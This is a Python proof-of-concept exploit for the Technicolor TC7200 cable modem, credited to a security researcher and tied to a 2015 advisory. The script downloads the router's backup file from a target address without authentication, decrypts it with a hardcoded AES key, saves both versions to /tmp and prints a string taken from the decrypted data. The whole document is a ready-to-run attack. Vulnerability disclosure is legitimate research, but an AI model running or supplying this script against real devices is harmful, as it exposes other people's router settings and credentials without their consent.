#
# POC code for Technicolor TC7200
#
# Demonstrates the following vulnerabilities
#  - Unauthenticated backup file access
#  - Backup file decryption
#
# Credit: Gergely Eberhardt (@ebux25) from SEARCH-LAB Ltd. (www.search-lab.hu)
#
# Advisory: http://www.search-lab.hu/advisories/secadv-20150720

import binascii
import sys

import requests
from Crypto.Cipher import AES


class Technicolor:
    def __init__(self, address, port):
        self.address = address
        self.port = port
        self.s = requests.Session()

    def get_uri(self, uri):
        return 'http://%s:%d/%s' % (self.address, self.port, uri)

    def download_backup_file(self):
        r = self.s.get(self.get_uri('goform/system/GatewaySettings.bin'))
        resp = ''
        for chunk in r:
            resp += chunk
        return resp

    def parse_backup(self, _backup):
        p = _backup.find('VFH')
        vfh = ''
        if p > 0:
            offset = 13
            vfh = _backup[p:p+offset]
        return vfh

    def decrypt_backup(self, _backup):
        key = binascii.unhexlify('000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F')
        l = (len(_backup)/16)*16
        cipher = AES.new(key, AES.MODE_ECB, '\x00'*16)
        plain = cipher.decrypt(_backup[0:l])
        return plain


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print 'Usage: vfh.py address [port]'
        print 'Example: python vfh 192.168.0.1\n'
        exit(0)
    address = sys.argv[1]
    port = 80
    if len(sys.argv) == 3:
        port = int(sys.argv[2])
    t = Technicolor(address, port)
    backup = t.download_backup_file()
    if len(backup) > 0:
        open('/tmp/test.enc', 'wb').write(backup)
        plain = t.decrypt_backup(backup)
        open('/tmp/test.dec', 'wb').write(plain)
        print 'VFH string: %s' % t.parse_backup(plain)
